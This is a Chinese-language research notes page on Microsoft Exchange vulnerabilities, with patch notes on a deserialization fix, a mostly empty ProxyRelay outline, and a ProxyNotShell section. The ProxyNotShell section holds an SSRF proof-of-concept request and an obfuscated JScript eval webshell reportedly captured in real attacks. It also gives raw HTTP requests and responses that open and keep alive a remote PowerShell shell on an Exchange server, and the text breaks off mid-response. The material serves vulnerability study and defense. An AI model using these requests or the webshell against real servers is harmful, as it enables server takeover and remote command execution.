 - [从内存加载.NET程序集(Assembly.Load)的利用分析](https://3gstudent.github.io/%E4%BB%8E%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD.NET%E7%A8%8B%E5%BA%8F%E9%9B%86(Assembly.Load)%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90)
 - [从内存加载.NET程序集(execute-assembly)的利用分析](https://3gstudent.github.io/%E4%BB%8E%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD.NET%E7%A8%8B%E5%BA%8F%E9%9B%86(execute-assembly)%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90)
 - [利用JS加载.Net程序](https://3gstudent.github.io/%E5%88%A9%E7%94%A8JS%E5%8A%A0%E8%BD%BD.Net%E7%A8%8B%E5%BA%8F)
 - [通过.NET实现内存加载PE文件](https://3gstudent.github.io/%E9%80%9A%E8%BF%87.NET%E5%AE%9E%E7%8E%B0%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BDPE%E6%96%87%E4%BB%B6)


### 修复

KB5007409得到修复，最终反序列化的地方, 此处

 - ![](./pics/repair.png)

this.formatter为IClientExtensionCollectionFormatter的实现，仅剩

``` bash
Microsoft.Exchange.Data.ApplicationLogic.Extension.ClientExtensionCollectionFormatter.Deserialize(Stream):
    Collection
```

1. TypeConfuseDelegate 链

(1). 初始化 Formatter 的 Binder 属性时，将一个恶意类置入了白名单，导致内置的黑名单过滤失效。

(2). ChainedSerializationBinder 黑名单中某个类拼写错误，导致内置的黑名单过滤失效。

ClientExtensionCollectionFormatter.Deserialize() 改为使用 ExchangeBinaryFormatterFactory.CreateBinaryFormatter() 创建 Formatter 再反序列化数据，并且其 allowedTypes 设为空，而不是直接使用 TypedBinaryFormatter，甚至直接删除了 TypedBinaryFormatter 类。

2. ClaimsPrincipal 链

开发人员把类名写错，System.Security.ClaimsPrincipal 的正确写法应该是 System.Security.Claims.ClaimsPrincipal,直接改为正确的类名。


# ProxyRelay (暂无域环境)
## ProxyRelay part links

 - [A New Attack Surface on MS Exchange Part 4 - ProxyRelay!](https://blog.orange.tw/2022/10/proxyrelay-a-new-attack-surface-on-ms-exchange-part-4.html)
 - [ProxyRelay](https://github.com/HuanGMZzz/ProxyRelay)

 - 漏洞影响exchange版本信息

``` bash
 <= Exchange Server 2013 CU23
 <= Exchange Server 2016 CU23
 <= Exchange Server 2019 CU12
```

 - [Relaying NTLM authentication over RPC](https://blog.compass-security.com/2020/05/relaying-ntlm-authentication-over-rpc/)
 - [Attacking MS Exchange Web Interfaces](https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/)

### Round 1 - Relay to Exchange FrontEnd





### Round 2 - Relay to Exchange BackEnd
#### 2-1 Attacking BackEnd /EWS


#### 2-2 Attacking BackEnd /RPC


#### 2-3 Attacking BackEnd /PowerShell


#### 2-4 Patching BackEnd




### Round 3 - Relay to Windows DCOM
#### Patching DCOM






# ProxyNotShell (completed)
## ProxyNotShell part links

 - [ProxyNotShell — the story of the claimed zero days in Microsoft Exchange](https://doublepulsar.com/proxynotshell-the-story-of-the-claimed-zero-day-in-microsoft-exchange-5c63d963a9e9)
 - [WARNING: NEW ATTACK CAMPAIGN UTILIZED A NEW 0-DAY RCE VULNERABILITY ON MICROSOFT EXCHANGE SERVER](https://gteltsc.vn/blog/warning-new-attack-campaign-utilized-a-new-0day-rce-vulnerability-on-microsoft-exchange-server-12715.html)
 - [ProxyNotShell: CVE-2022-41040 and CVE-2022-41082 Exploits Explained](https://www.picussecurity.com/resource/blog/proxynotshellcve-2022-41040-and-cve-2022-41082-exploits-explained)
 - [Microsoft Exchange ProxyNotShell vulnerability explained and how to mitigate it](https://www.csoonline.com/article/3682762/microsoft-exchange-proxynotshell-vulnerability-explained-and-how-to-mitigate-it.html)
 - [Threat Brief: CVE-2022-41040 and CVE-2022-41082: Microsoft Exchange Server (ProxyNotShell)](https://unit42.paloaltonetworks.com/proxynotshell-cve-2022-41040-cve-2022-41082/)
 - [Analyzing attacks using the Exchange vulnerabilities CVE-2022-41040 and CVE-2022-41082](https://www.microsoft.com/en-us/security/blog/2022/09/30/analyzing-attacks-using-the-exchange-vulnerabilities-cve-2022-41040-and-cve-2022-41082/)

 - 漏洞影响exchange版本信息

``` bash
 <= Microsoft Exchange Server 2013, Exchange Server 2016, and Exchange Server 2019. September 2021 Cumulative Update (CU)
```

## 漏洞POC利用及原理分析

 - [CONTROL YOUR TYPES OR GET PWNED: REMOTE CODE EXECUTION IN EXCHANGE POWERSHELL BACKEND](https://www.zerodayinitiative.com/blog/2022/11/14/control-your-types-or-get-pwned-remote-code-execution-in-exchange-powershell-backend)
 - [CVE-2022-41040 and CVE-2022-41082 – zero-days in MS Exchange](https://securelist.com/cve-2022-41040-and-cve-2022-41082-zero-days-in-ms-exchange/108364/)
 - [Proxynotshell 反序列化及 CVE-2023-21707 漏洞研究](https://xz.aliyun.com/t/12634?accounttraceid=97643b6cad1f48a9bc8b9b3016267889gmyp)
 - [All the Proxy(Not)Shells](https://www.splunk.com/en_us/blog/security/all-the-proxy-not-shells.html)
 - [ProxyNotShell 漏洞分析](https://blog.caspersun.club/2022/12/19/proxynotshell/proxynotshell/)

## 详情总结

| ZDI | CVE |
| ----------- | ----------- |
| ZDI-CAN-18802 | CVE-2022-41040 |
| ZDI-CAN-18333 | CVE-2022-41082 |

该漏洞利用链为认证后RCE(需要输入账号密码)

该SSRF攻击请求入口和2021年的ProxyShell漏洞一样

 - CVE-2022-41040 poc

``` bash
GET /autodiscover/autodiscover.json?@zdi/PowerShell?serializationLevel=Full;ExchClientVer=15.2.922.7;clientApplication=ManagementShell;TargetServer=;PSVersion=5.1.17763.592&Email=autodiscover/autodiscover.json%3F@zdi HTTP/1.1
Host: 192.168.1.10
Authorization: Basic cG9jdXNlcjpwb2NwYXNzd2QK
Connection: close
```

成功利用CVE-2022-41040漏洞后，能向任意后端服务发送带有LocalSystem权限的URI和数据的请求

ProxyNotShell链中的第二个漏洞是CVE-2022-41082，这是一个在Exchange PowerShell后端发现的远程代码执行漏洞。它的CVSS得分为8.8(高)。攻击者通过滥用CVE-2022-41040绕过身份验证后，利用CVE-2022-41082在易受攻击的Exchange服务器上运行任意命令。

这些被攻击的Exchange服务器的版本号显示已经安装了最新的更新，因此利用之前proxyshell的Proxyshell后端的漏洞是不可能的，所以可以确认这是一个新的0day RCE漏洞利用链

此外，给出的修复手段与2021年的ProxyShell Powershell RCE完全相同

由于利用CVE-2022-41040和CVE-2022-41082攻击者利用和ProxyShell漏洞的相同SSRF->RCE攻击流程，但需要对Exchange服务器进行身份验证，所以Kevin Beaumont将此漏洞链命名为ProxyNotShell，以其前身命名。

 - 实际攻击捕获到的antsword webshell

``` bash
<%@Page Language="Jscript"%>
<%eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('NTcyM'+'jk3O3'+'ZhciB'+'zYWZl'+''+'P'+'S'+char(837-763)+System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('MQ=='))+char(51450/525)+''+''+char(0640-0462)+char(0x8c28/0x1cc)+char(0212100/01250)+System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('Wg=='))+'m'+''+'UiO2V'+'2YWwo'+'UmVxd'+'WVzdC'+'5JdGV'+'tWydF'+'WjBXS'+'WFtRG'+'Z6bU8'+'xajhk'+'J10sI'+'HNhZm'+'UpOzE'+'3MTY4'+'OTE7'+'')));%>
```

ProxyShell漏洞的利用只发生在端口443上(HTTPS)，而ProxyNotShell端口5985(HTTP)和5986(HTTPS)也在利用范围内

## ProxyNotShell 利用细节
### step1

使用XML SOAP发起PsRemoting的HTTP POST请求

通过WSMAN协议访问基于web的企业管理(WBEM)。攻击者在易受攻击的系统上启动shell，以便通过Windows远程管理(PsRemoting)进一步执行PowerShell脚本。

 - ![](pics/proxynotshell5.png)

 - request

``` bash
POST /autodiscover/admin@localhost//powershell/autodiscover.json?x=a HTTP/1.1
Host: 192.168.14.6
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Content-Type: application/soap+xml;charset=UTF-8
Cookie: Email=autodiscover/admin@localhost
Content-Length: 7076
Authorization: NTLM TlRMTVNTUAADAAAAGAAYAHIAAAAmASYBigAAAAAAAABYAAAAGgAaAFgAAAAAAAAAcgAAABAAEACwAQAANYKJ4gYBsR0AAAAPhC4i/YVS+VB0G4hNptNku2EAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdwnLRH74UZh1WHEOmDltNwEBAAAAAAAAZCww0zTi2QHzuBzg/jLiNgAAAAACABgARQBYAEMASABBAE4ARwBFADIAMAAxADYAAQAeAFcASQBOAC0AVQBQAEYAMAA5AFIANwBIADIANgA0AAQAIABlAHgAYwBoAGEAbgBnAGUAMgAwADEANgAuAGMAbwBtAAMAQABXAEkATgAtAFUAUABGADAAOQBSADcASAAyADYANAAuAGUAeABjAGgAYQBuAGcAZQAyADAAMQA2AC4AYwBvAG0ABQAgAGUAeABjAGgAYQBuAGcAZQAyADAAMQA2AC4AYwBvAG0ABwAIAGQsMNM04tkBBgAEAAIAAAAKABAA5zRZWjBRW9TZInuvk2v9vQAAAAAAAAAAhe1lJqMaH9fVr+rLcgUHxA==

<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
        <s:Header>
                <a:To>https://exchange16.domaincorp.com:443/PowerShell?PSVersion=5.1.19041.610</a:To>
                <w:ResourceURI s:mustUnderstand="true">http://schemas.microsoft.com/powershell/Microsoft.Exchange</w:ResourceURI>
                <a:ReplyTo>
                        <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
                </a:ReplyTo>
                <a:Action s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Create</a:Action>
                <w:MaxEnvelopeSize s:mustUnderstand="true">512000</w:MaxEnvelopeSize>
                <a:MessageID>uuid:89d1d533-39ea-4e1f-b566-463e276e9ce8</a:MessageID>
                <w:Locale xml:lang="en-US" s:mustUnderstand="false" />
                <p:DataLocale xml:lang="en-US" s:mustUnderstand="false" />
                <p:SessionId s:mustUnderstand="false">uuid:d5a6b749-9109-4bc7-969a-4223ef795a72</p:SessionId>
                <p:OperationID s:mustUnderstand="false">uuid:381b8e15-dff7-4812-9867-3bc71f9b5ed3</p:OperationID>
                <p:SequenceId s:mustUnderstand="false">1</p:SequenceId>
                <w:OptionSet xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" s:mustUnderstand="true">

                        <w:Option Name="protocolversion" MustComply="true">2.3</w:Option>
                </w:OptionSet>
                <w:OperationTimeout>PT180.000S</w:OperationTimeout>
        </s:Header>
        <s:Body>
                <rsp:Shell xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" Name="WinRM10" >
                        <rsp:InputStreams>stdin pr</rsp:InputStreams>
                        <rsp:OutputStreams>stdout</rsp:OutputStreams>
                        <creationXml xmlns="http://schemas.microsoft.com/powershell">AAAAAAAAAAEAAAAAAAAAAAMAAADHAgAAAAIAAQCkwAes2LBAQZqGoPGMPzz/AAAAAAAAAAAAAAAAAAAAADxPYmogUmVmSWQ9IjAiPjxNUz48VmVyc2lvbiBOPSJwcm90b2NvbHZlcnNpb24iPjIuMzwvVmVyc2lvbj48VmVyc2lvbiBOPSJQU1ZlcnNpb24iPjIuMDwvVmVyc2lvbj48VmVyc2lvbiBOPSJTZXJpYWxpemF0aW9uVmVyc2lvbiI+MS4xLjAuMTwvVmVyc2lvbj48L01TPjwvT2JqPgAAAAAAAAACAAAAAAAAAAADAAAOiwIAAAAEAAEApMAHrNiwQEGahqDxjD88/wAAAAAAAAAAAAAAAAAAAAA8T2JqIFJlZklkPSIwIj48TVM+PEkzMiBOPSJNaW5SdW5zcGFjZXMiPjE8L0kzMj48STMyIE49Ik1heFJ1bnNwYWNlcyI+MTwvSTMyPjxPYmogTj0iUFNUaHJlYWRPcHRpb25zIiBSZWZJZD0iMSI+PFROIFJlZklkPSIwIj48VD5TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlJ1bnNwYWNlcy5QU1RocmVhZE9wdGlvbnM8L1Q+PFQ+U3lzdGVtLkVudW08L1Q+PFQ+U3lzdGVtLlZhbHVlVHlwZTwvVD48VD5TeXN0ZW0uT2JqZWN0PC9UPjwvVE4+PFRvU3RyaW5nPkRlZmF1bHQ8L1RvU3RyaW5nPjxJMzI+MDwvSTMyPjwvT2JqPjxPYmogTj0iQXBhcnRtZW50U3RhdGUiIFJlZklkPSIyIj48VE4gUmVmSWQ9IjEiPjxUPlN5c3RlbS5UaHJlYWRpbmcuQXBhcnRtZW50U3RhdGU8L1Q+PFQ+U3lzdGVtLkVudW08L1Q+PFQ+U3lzdGVtLlZhbHVlVHlwZTwvVD48VD5TeXN0ZW0uT2JqZWN0PC9UPjwvVE4+PFRvU3RyaW5nPlVua25vd248L1RvU3RyaW5nPjxJMzI+MjwvSTMyPjwvT2JqPjxPYmogTj0iQXBwbGljYXRpb25Bcmd1bWVudHMiIFJlZklkPSIzIj48VE4gUmVmSWQ9IjIiPjxUPlN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNQcmltaXRpdmVEaWN0aW9uYXJ5PC9UPjxUPlN5c3RlbS5Db2xsZWN0aW9ucy5IYXNodGFibGU8L1Q+PFQ+U3lzdGVtLk9iamVjdDwvVD48L1ROPjxEQ1Q+PEVuPjxTIE49IktleSI+UFNWZXJzaW9uVGFibGU8L1M+PE9iaiBOPSJWYWx1ZSIgUmVmSWQ9IjQiPjxUTlJlZiBSZWZJZD0iMiIgLz48RENUPjxFbj48UyBOPSJLZXkiPlBTVmVyc2lvbjwvUz48VmVyc2lvbiBOPSJWYWx1ZSI+NS4xLjE5MDQxLjYxMDwvVmVyc2lvbj48L0VuPjxFbj48UyBOPSJLZXkiPlBTRWRpdGlvbjwvUz48UyBOPSJWYWx1ZSI+RGVza3RvcDwvUz48L0VuPjxFbj48UyBOPSJLZXkiPlBTQ29tcGF0aWJsZVZlcnNpb25zPC9TPjxPYmogTj0iVmFsdWUiIFJlZklkPSI1Ij48VE4gUmVmSWQ9IjMiPjxUPlN5c3RlbS5WZXJzaW9uW108L1Q+PFQ+U3lzdGVtLkFycmF5PC9UPjxUPlN5c3RlbS5PYmplY3Q8L1Q+PC9UTj48TFNUPjxWZXJzaW9uPjEuMDwvVmVyc2lvbj48VmVyc2lvbj4yLjA8L1ZlcnNpb24+PFZlcnNpb24+My4wPC9WZXJzaW9uPjxWZXJzaW9uPjQuMDwvVmVyc2lvbj48VmVyc2lvbj41LjA8L1ZlcnNpb24+PFZlcnNpb24+NS4xLjE5MDQxLjYxMDwvVmVyc2lvbj48L0xTVD48L09iaj48L0VuPjxFbj48UyBOPSJLZXkiPkNMUlZlcnNpb248L1M+PFZlcnNpb24gTj0iVmFsdWUiPjQuMC4zMDMxOS40MjAwMDwvVmVyc2lvbj48L0VuPjxFbj48UyBOPSJLZXkiPkJ1aWxkVmVyc2lvbjwvUz48VmVyc2lvbiBOPSJWYWx1ZSI+MTAuMC4xOTA0MS42MTA8L1ZlcnNpb24+PC9Fbj48RW4+PFMgTj0iS2V5Ij5XU01hblN0YWNrVmVyc2lvbjwvUz48VmVyc2lvbiBOPSJWYWx1ZSI+My4wPC9WZXJzaW9uPjwvRW4+PEVuPjxTIE49IktleSI+UFNSZW1vdGluZ1Byb3RvY29sVmVyc2lvbjwvUz48VmVyc2lvbiBOPSJWYWx1ZSI+Mi4zPC9WZXJzaW9uPjwvRW4+PEVuPjxTIE49IktleSI+U2VyaWFsaXphdGlvblZlcnNpb248L1M+PFZlcnNpb24gTj0iVmFsdWUiPjEuMS4wLjE8L1ZlcnNpb24+PC9Fbj48L0RDVD48L09iaj48L0VuPjwvRENUPjwvT2JqPjxPYmogTj0iSG9zdEluZm8iIFJlZklkPSI2Ij48TVM+PE9iaiBOPSJfaG9zdERlZmF1bHREYXRhIiBSZWZJZD0iNyI+PE1TPjxPYmogTj0iZGF0YSIgUmVmSWQ9IjgiPjxUTiBSZWZJZD0iNCI+PFQ+U3lzdGVtLkNvbGxlY3Rpb25zLkhhc2h0YWJsZTwvVD48VD5TeXN0ZW0uT2JqZWN0PC9UPjwvVE4+PERDVD48RW4+PEkzMiBOPSJLZXkiPjk8L0kzMj48T2JqIE49IlZhbHVlIiBSZWZJZD0iOSI+PE1TPjxTIE49IlQiPlN5c3RlbS5TdHJpbmc8L1M+PFMgTj0iViI+QWRtaW5pc3RyYXRvcjogV2luZG93cyBQb3dlclNoZWxsPC9TPjwvTVM+PC9PYmo+PC9Fbj48RW4+PEkzMiBOPSJLZXkiPjg8L0kzMj48T2JqIE49IlZhbHVlIiBSZWZJZD0iMTAiPjxNUz48UyBOPSJUIj5TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkhvc3QuU2l6ZTwvUz48T2JqIE49IlYiIFJlZklkPSIxMSI+PE1TPjxJMzIgTj0id2lkdGgiPjI3NDwvSTMyPjxJMzIgTj0iaGVpZ2h0Ij43MjwvSTMyPjwvTVM+PC9PYmo+PC9NUz48L09iaj48L0VuPjxFbj48STMyIE49IktleSI+NzwvSTMyPjxPYmogTj0iVmFsdWUiIFJlZklkPSIxMiI+PE1TPjxTIE49IlQiPlN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uSG9zdC5TaXplPC9TPjxPYmogTj0iViIgUmVmSWQ9IjEzIj48TVM+PEkzMiBOPSJ3aWR0aCI+MTIwPC9JMzI+PEkzMiBOPSJoZWlnaHQiPjcyPC9JMzI+PC9NUz48L09iaj48L01TPjwvT2JqPjwvRW4+PEVuPjxJMzIgTj0iS2V5Ij42PC9JMzI+PE9iaiBOPSJWYWx1ZSIgUmVmSWQ9IjE0Ij48TVM+PFMgTj0iVCI+U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5Ib3N0LlNpemU8L1M+PE9iaiBOPSJWIiBSZWZJZD0iMTUiPjxNUz48STMyIE49IndpZHRoIj4xMjA8L0kzMj48STMyIE49ImhlaWdodCI+NTA8L0kzMj48L01TPjwvT2JqPjwvTVM+PC9PYmo+PC9Fbj48RW4+PEkzMiBOPSJLZXkiPjU8L0kzMj48T2JqIE49IlZhbHVlIiBSZWZJZD0iMTYiPjxNUz48UyBOPSJUIj5TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkhvc3QuU2l6ZTwvUz48T2JqIE49IlYiIFJlZklkPSIxNyI+PE1TPjxJMzIgTj0id2lkdGgiPjEyMDwvSTMyPjxJMzIgTj0iaGVpZ2h0Ij4zMDAwPC9JMzI+PC9NUz48L09iaj48L01TPjwvT2JqPjwvRW4+PEVuPjxJMzIgTj0iS2V5Ij40PC9JMzI+PE9iaiBOPSJWYWx1ZSIgUmVmSWQ9IjE4Ij48TVM+PFMgTj0iVCI+U3lzdGVtLkludDMyPC9TPjxJMzIgTj0iViI+MjU8L0kzMj48L01TPjwvT2JqPjwvRW4+PEVuPjxJMzIgTj0iS2V5Ij4zPC9JMzI+PE9iaiBOPSJWYWx1ZSIgUmVmSWQ9IjE5Ij48TVM+PFMgTj0iVCI+U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5Ib3N0LkNvb3JkaW5hdGVzPC9TPjxPYmogTj0iViIgUmVmSWQ9IjIwIj48TVM+PEkzMiBOPSJ4Ij4wPC9JMzI+PEkzMiBOPSJ5Ij4wPC9JMzI+PC9NUz48L09iaj48L01TPjwvT2JqPjwvRW4+PEVuPjxJMzIgTj0iS2V5Ij4yPC9JMzI+PE9iaiBOPSJWYWx1ZSIgUmVmSWQ9IjIxIj48TVM+PFMgTj0iVCI+U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5Ib3N0LkNvb3JkaW5hdGVzPC9TPjxPYmogTj0iViIgUmVmSWQ9IjIyIj48TVM+PEkzMiBOPSJ4Ij4wPC9JMzI+PEkzMiBOPSJ5Ij45PC9JMzI+PC9NUz48L09iaj48L01TPjwvT2JqPjwvRW4+PEVuPjxJMzIgTj0iS2V5Ij4xPC9JMzI+PE9iaiBOPSJWYWx1ZSIgUmVmSWQ9IjIzIj48TVM+PFMgTj0iVCI+U3lzdGVtLkNvbnNvbGVDb2xvcjwvUz48STMyIE49IlYiPjU8L0kzMj48L01TPjwvT2JqPjwvRW4+PEVuPjxJMzIgTj0iS2V5Ij4wPC9JMzI+PE9iaiBOPSJWYWx1ZSIgUmVmSWQ9IjI0Ij48TVM+PFMgTj0iVCI+U3lzdGVtLkNvbnNvbGVDb2xvcjwvUz48STMyIE49IlYiPjY8L0kzMj48L01TPjwvT2JqPjwvRW4+PC9EQ1Q+PC9PYmo+PC9NUz48L09iaj48QiBOPSJfaXNIb3N0TnVsbCI+ZmFsc2U8L0I+PEIgTj0iX2lzSG9zdFVJTnVsbCI+ZmFsc2U8L0I+PEIgTj0iX2lzSG9zdFJhd1VJTnVsbCI+ZmFsc2U8L0I+PEIgTj0iX3VzZVJ1bnNwYWNlSG9zdCI+ZmFsc2U8L0I+PC9NUz48L09iaj48L01TPjwvT2JqPg==</creationXml>
                </rsp:Shell>
        </s:Body>
</s:Envelope>
```

 - response

``` bash
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: application/soap+xml;charset=UTF-8
Content-Encoding: gzip
Vary: Accept-Encoding
Server: Microsoft-IIS/10.0
request-id: 9e7c0cd2-dffd-48da-8fd4-c0e272cecb1f
X-CalculatedBETarget: win-upf09r7h264.exchange2016.com
X-AspNet-Version: 4.0.30319
Set-Cookie: X-BackEndCookie=S-1-5-21-46962994-2066588249-799565096-500=u56Lnp2ejJqBmsmZy5yZz8zSns2bzNLLysmd0sbOy8/SzJ2eyMjOmc+enJ7HgYHNz83M0s7P0s/Hq8/Gxc7Lxc/GgZqHnJeekZiazc/OydGckJKBzw==; expires=Sun, 08-Oct-2023 09:14:09 GMT; path=/autodiscover; secure; HttpOnly
Persistent-Auth: true
X-Powered-By: ASP.NET
X-FEServer: WIN-UPF09R7H264
Date: Fri, 08 Sep 2023 09:14:09 GMT
Content-Length: 866

<s:Envelope xml:lang="zh-CN" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.xmlsoap.org/ws/2004/09/transfer/CreateResponse</a:Action><a:MessageID>uuid:7F45298C-DA0C-4B21-8345-C1064F467C36</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:89d1d533-39ea-4e1f-b566-463e276e9ce8</a:RelatesTo></s:Header><s:Body><x:ResourceCreated><a:Address>https://exchange16.domaincorp.com:443/PowerShell?PSVersion=5.1.19041.610</a:Address><a:ReferenceParameters><w:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</w:ResourceURI><w:SelectorSet><w:Selector Name="ShellId">29E4FDEC-DF97-4A5B-A515-8D25F7CD3437</w:Selector></w:SelectorSet></a:ReferenceParameters></x:ResourceCreated><rsp:Shell xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell"><rsp:ShellId>29E4FDEC-DF97-4A5B-A515-8D25F7CD3437</rsp:ShellId><rsp:ResourceUri>http://schemas.microsoft.com/powershell/Microsoft.Exchange</rsp:ResourceUri><rsp:Owner>exchange2016\administrator</rsp:Owner><rsp:ClientIP>fe80::841b:99cc:dec2:b8a%5</rsp:ClientIP><rsp:IdleTimeOut>PT900.000S</rsp:IdleTimeOut><rsp:InputStreams>stdin pr</rsp:InputStreams><rsp:OutputStreams>stdout</rsp:OutputStreams><rsp:ShellRunTime>P0DT0H0M0S</rsp:ShellRunTime><rsp:ShellInactivity>P0DT0H0M0S</rsp:ShellInactivity></rsp:Shell></s:Body></s:Envelope>
```

### step2

使用XML SOAP的HTTP POST请求来延长shell的生命周期

启动shell后，攻击者立即延长其生命周期；否则，默认情况下，由于shell的过期时间太短，shell将被关闭。这是在Exchange Server上进一步执行命令所必需的。要做到这一点，攻击者立即通过启用keep alive选项的WSMAN发送一个特殊请求。

 - ![](pics/proxynotshell6.png)

 - request

``` bash
POST /autodiscover/admin@localhost//powershell/autodiscover.json?x=a HTTP/1.1
Host: 192.168.14.6
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Content-Type: application/soap+xml;charset=UTF-8
Cookie: X-BackEndCookie=S-1-5-21-46962994-2066588249-799565096-500=u56Lnp2ejJqBmsmZy5yZz8zSns2bzNLLysmd0sbOy8/SzJ2eyMjOmc+enJ7HgYHNz83M0s7P0s/Hq8/Gxc3NxczJgZqHnJeekZiazc/OydGckJKBzw==; Email=autodiscover/admin@localhost
Content-Length: 1731

<s:Envelope xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsman="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:wsmv="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
    <s:Header>
        <wsa:Action s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive</wsa:Action>
        <wsmv:DataLocale s:mustUnderstand="false" xml:lang="en-US" />
        <wsman:Locale s:mustUnderstand="false" xml:lang="en-US" />
        <wsman:MaxEnvelopeSize s:mustUnderstand="true">512000</wsman:MaxEnvelopeSize>
        <wsa:MessageID>uuid:e7b63b02-c710-4671-8bc8-ef16fbd3dd2f</wsa:MessageID>
        <wsman:OperationTimeout>PT20S</wsman:OperationTimeout>
        <wsa:ReplyTo>
            <wsa:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</wsa:Address>
        </wsa:ReplyTo>
        <wsman:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>
        <wsmv:SessionId s:mustUnderstand="false">uuid:9f62f84e-9ccf-47dc-9c85-44528f897ec6</wsmv:SessionId>
        <wsa:To>http://ex01.lab.local/</wsa:To>
        <wsman:OptionSet s:mustUnderstand="true">
            <wsman:Option Name="WSMAN_CMDSHELL_OPTION_KEEPALIVE">True</wsman:Option>
        </wsman:OptionSet>
        <wsman:SelectorSet>
            <wsman:Selector Name="ShellId">84E4CBD2-CE57-4D84-B623-0ADD3EBAFF2A</wsman:Selector>
        </wsman:SelectorSet>
    </s:Header>
    <s:Body>
        <rsp:Receive>
            <rsp:DesiredStream>stdout</rsp:DesiredStream>
        </rsp:Receive>
    </s:Body>
        </s:Envelope>
```

 - response

``` bash
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: application/soap+xml;charset=UTF-8
Content-Encoding: gzip
Vary: Accept-Encoding
Server: Microsoft-IIS/10.0
request-id: bc066085-69d9-4848-909a-c24723f86a29
X-CalculatedBETarget: win-upf09r7h264.exchange2016.com
X-AspNet-Version: 4.0.30319
Set-Cookie: X-BackEndCookie=S-1-5-21-46962994-2066588249-799565096-500=u56Lnp2ejJqBmsmZy5yZz8zSns2bzNLLysmd0sbOy8/SzJ2eyMjOmc+enJ7HgYHNz83M0s7P0s/Hq8/Gxc3NxczIgZqHnJeekZiazc/OydGckJKBzw==; expires=Sun, 08-Oct-2023 09:22:37 GMT; path=/autodiscover; secure; HttpOnly
X-Powered-By: ASP.NET
X-FEServer: WIN-UPF09R7H264
Date: Fri, 08 Sep 2023 09:22:36 GMT
Content-Length: 678

<s:Envelope xml:lang="zh-CN" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/ReceiveResponse</a:Action><a:MessageID>uuid:6747A94B-9EB8-479A-9A52-F85A259A1B3D</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:e7b63b02-c710-4671-8bc8-ef16fbd3dd2f</a:RelatesTo></s:Header><s:Body><rsp:ReceiveResponse><rsp:Stream 